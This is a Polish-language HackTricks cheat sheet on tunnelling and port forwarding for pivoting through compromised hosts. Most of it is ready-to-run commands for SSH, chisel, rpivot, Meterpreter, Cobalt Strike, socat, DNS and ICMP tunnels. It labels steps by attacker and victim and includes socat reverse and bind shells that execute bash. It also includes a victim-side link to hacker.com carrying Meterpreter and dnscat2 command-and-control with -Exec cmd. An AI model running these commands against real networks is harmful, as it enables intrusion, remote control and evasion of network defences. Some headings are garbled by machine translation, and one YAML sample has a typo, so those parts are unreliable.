# Tunelowanie i Przekierowanie Portów

<details>

<summary><strong>Nauka hakowania AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Czy pracujesz w **firmie z branży cyberbezpieczeństwa**? Chcesz zobaczyć swoją **firmę reklamowaną na HackTricks**? lub chcesz mieć dostęp do **najnowszej wersji PEASS lub pobrać HackTricks w formacie PDF**? Sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* **Dołącz do** [**💬**](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do [repozytorium hacktricks](https://github.com/carlospolop/hacktricks) i [repozytorium hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

**Grupa Try Hard Security**

<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

## Wskazówka dotycząca Nmap

{% hint style="warning" %}
Skanowanie **ICMP** i **SYN** nie może być tunelowane przez proxy socks, dlatego musimy **wyłączyć odkrywanie pingów** (`-Pn`) i określić **skany TCP** (`-sT`), aby to działało.
{% endhint %}

## **Bash**

**Host -> Skok -> WewnętrznyA -> WewnętrznyB**
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

Graficzne połączenie SSH (X)
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Lokalne przekierowanie portu

Otwórz nowy port na serwerze SSH --> Inny port
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

Lokalny port --> Skompromitowany host (SSH) --> Trzecia\_skrzynka:Port
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

Port lokalny --> Zainfekowany host (SSH) --> Dokądkolwiek
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Odwrócone przekierowywanie portów

Jest to przydatne do uzyskiwania odwróconych powłok z wewnętrznych hostów przez strefę zdemilitaryzowaną (DMZ) do Twojego hosta:
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and caputure it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### Tunel VPN

Potrzebujesz **uprawnień root na obu urządzeniach** (ponieważ będziesz tworzyć nowe interfejsy) i konfiguracja sshd musi zezwalać na logowanie jako root:\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ifconfig tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ifconfig tun0 up #Activate the server side network interface
```
Włącz przekierowywanie po stronie Serwera
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
Ustaw nową trasę po stronie klienta
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
## SSHUTTLE

Możesz **tunelować** cały **ruch** do **podsieci** za pośrednictwem hosta przy użyciu **ssh**.\
Na przykład przekierowanie całego ruchu idącego do 10.10.10.0/24
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
Połącz się za pomocą klucza prywatnego
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

### Port2Port

Port lokalny --> Skompromitowany host (aktywna sesja) --> Trzecia\_skrzynka:Port
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS

SOCKS (Socket Secure) jest protokołem internetowym, który umożliwia przekierowywanie ruchu sieciowego między klientem a serwerem za pośrednictwem serwera pośredniczącego. SOCKS jest przydatny do tunelowania ruchu sieciowego, umożliwiając ukrycie prawdziwego źródła ruchu.
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
Inny sposób:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

### Proxy SOCKS

Otwórz port w teamserverze nasłuchującym na wszystkich interfejsach, które można użyć do **przekierowania ruchu przez beacon**.
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

{% hint style="warning" %}
W tym przypadku **port jest otwarty na hoście bieżącym**, a nie na Serwerze Zespołu, a ruch jest wysyłany do Serwera Zespołu, a stamtąd do wskazanego hosta:port
{% endhint %}
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
### rPort2Port lokalny

{% hint style="warning" %}
W tym przypadku **port jest otwarty na hoście Beacon**, a nie na Serwerze Zespołu, a **ruch jest wysyłany do klienta Cobalt Strike** (a nie do Serwera Zespołu) i stamtąd do wskazanego hosta:port
{% endhint %}
```
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Musisz przesłać plik tunelu sieciowego: ashx|aspx|js|jsp|php|php|jsp
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Dłuto

Możesz pobrać je ze strony wydań [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
Musisz użyć **tej samej wersji dla klienta i serwera**

### skarpeta
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Przekierowywanie portów
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Odwrócony tunel. Tunel jest uruchamiany od ofiary.\
Proxy socks4 jest tworzone na 127.0.0.1:1080
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
Przejdź przez **serwer proxy NTLM**
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Powiązany shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Odwrócony shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port

### Port2Port
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### Port2Port przez skarpety
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### Meterpreter poprzez SSL Socat
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
Możesz ominąć **nieuwierzytelniony proxy** wykonując tę linię zamiast ostatniej w konsoli ofiary:
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
### Tunel SSL z użyciem Socat

**Konsola /bin/sh**

Utwórz certyfikaty po obu stronach: Klienta i Serwera
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Zdalne przekierowanie portu do portu

Połącz lokalny port SSH (22) z portem 443 hosta atakującego
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

To jest wersja konsolowa PuTTY (opcje są bardzo podobne do klienta ssh).

Ponieważ ten plik binarny będzie wykonywany u ofiary i jest to klient ssh, musimy otworzyć naszą usługę ssh i port, abyśmy mogli uzyskać odwrotność połączenia. Następnie, aby przekierować tylko lokalnie dostępny port na port w naszym komputerze:
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

Musisz być lokalnym administratorem (dla dowolnego portu)
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

Musisz mieć **dostęp RDP do systemu**.\
Pobierz:

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - To narzędzie wykorzystuje `Dynamic Virtual Channels` (`DVC`) z funkcji usługi Pulpitu zdalnego systemu Windows. DVC jest odpowiedzialny za **tunelowanie pakietów przez połączenie RDP**.
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

Na komputerze klienta załaduj **`SocksOverRDP-Plugin.dll`** w ten sposób:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
Teraz możemy **połączyć** się z **ofiarą** za pomocą **RDP** używając **`mstsc.exe`**, i powinniśmy otrzymać **komunikat**, że wtyczka **SocksOverRDP jest włączona**, i będzie **nasłuchiwać** na **127.0.0.1:1080**.

**Połącz** się za pomocą **RDP** i wgraj oraz uruchom na maszynie ofiary plik binarny `SocksOverRDP-Server.exe`:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
Teraz potwierdź na swoim komputerze (atakującym), że port 1080 nasłuchuje:
```
netstat -antb | findstr 1080
```
Teraz możesz użyć [**Proxifier**](https://www.proxifier.com/) **do przekierowania ruchu przez ten port.**

## Proxify Aplikacje GUI w systemie Windows

Możesz sprawić, że aplikacje GUI w systemie Windows będą korzystać z proxy za pomocą [**Proxifier**](https://www.proxifier.com/).\
W **Profil -> Serwery Proxy** dodaj IP i port serwera SOCKS.\
W **Profil -> Reguły Proksyfikacji** dodaj nazwę programu do proksyfikacji oraz połączenia do adresów IP, które chcesz proksyfikować.

## Pomijanie proxy NTLM

Wspomniane wcześniej narzędzie: **Rpivot**\
**OpenVPN** może również je ominąć, ustawiając te opcje w pliku konfiguracyjnym:
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Uwierzytelnia się wobec serwera proxy i wiąże lokalny port, który jest przekierowany do zewnętrznej usługi, którą określisz. Następnie możesz korzystać z wybranego narzędzia za pośrednictwem tego portu.\
Na przykład przekierowuje port 443
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
Teraz, jeśli ustawisz na przykład na ofierze usługę **SSH** do nasłuchiwania na porcie 443. Możesz się do niej podłączyć przez port 2222 atakującego.\
Możesz również użyć **meterpreter**, który łączy się z localhost:443, a atakujący nasłuchuje na porcie 2222.

## YARP

Odwrócony proxy stworzony przez Microsoft. Możesz go znaleźć tutaj: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)

## Tunelowanie DNS

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Do tworzenia adapterów tun oraz tunelowania danych między nimi za pomocą zapytań DNS, wymagane jest posiadanie uprawnień roota w obu systemach.
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
Tunel będzie bardzo wolny. Możesz utworzyć skompresowane połączenie SSH przez ten tunel, korzystając z:
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**Pobierz go stąd**](https://github.com/iagox86/dnscat2)**.**

Ustanawia kanał C\&C poprzez DNS. Nie wymaga uprawnień root.
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **W PowerShell**

Możesz użyć [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell), aby uruchomić klienta dnscat2 w PowerShell:
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **Przekierowywanie portów za pomocą dnscat**
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### Zmiana DNS w proxychains

Proxychains przechwytuje wywołanie biblioteki `gethostbyname` i tuneluje żądanie tcp DNS przez proxy socks. Domyślnie serwer **DNS**, którego używa proxychains to **4.2.2.2** (wbudowany). Aby go zmienić, edytuj plik: _/usr/lib/proxychains3/proxyresolv_ i zmień adres IP. Jeśli pracujesz w środowisku **Windows**, możesz ustawić adres IP **kontrolera domeny**.

## Tunelowanie w Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

## Tunelowanie ICMP

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

W obu systemach wymagane jest posiadanie uprawnień roota do utworzenia adapterów tun i tunelowania danych między nimi za pomocą żądań echo ICMP.
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**Pobierz go stąd**](https://github.com/utoni/ptunnel-ng.git).
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

**[ngrok](https://ngrok.com/) to narzędzie do wystawiania rozwiązań w Internecie za pomocą jednej linii poleceń.**
*URI wystawienia wyglądają jak:* **UID.ngrok.io**

### Instalacja

- Utwórz konto: https://ngrok.com/signup
- Pobierz klient:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### Podstawowe zastosowania

**Dokumentacja:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

*Jeśli jest to konieczne, można również dodać uwierzytelnienie i TLS.*

#### Tunelowanie TCP
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### Ujawnianie plików za pomocą protokołu HTTP
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### Przechwytywanie wywołań HTTP

*Przydatne dla XSS, SSRF, SSTI ...*
Bezpośrednio z stdout lub w interfejsie HTTP [http://127.0.0.1:4040](http://127.0.0.1:4000).

#### Tunelowanie wewnętrznego serwisu HTTP
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### Przykład prostiej konfiguracji ngrok.yaml

Otwiera 3 tunele:
- 2 TCP
- 1 HTTP z wystawianiem statycznych plików z /tmp/httpbin/
```yaml
tunnels:
mytcp:
addr: 4444
proto: tcptunne
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Inne narzędzia do sprawdzenia

* [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
* [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

**Try Hard Security Group**

<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

<details>

<summary><strong>Zacznij od zera i zostań ekspertem AWS w dziedzinie hakowania dzięki</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Czy pracujesz w **firmie zajmującej się cyberbezpieczeństwem**? Chcesz zobaczyć, jak Twoja **firma jest reklamowana w HackTricks**? lub chcesz mieć dostęp do **najnowszej wersji PEASS lub pobrać HackTricks w formacie PDF**? Sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* **Dołącz do** [**💬**](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do [repozytorium hacktricks](https://github.com/carlospolop/hacktricks) i [repozytorium hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
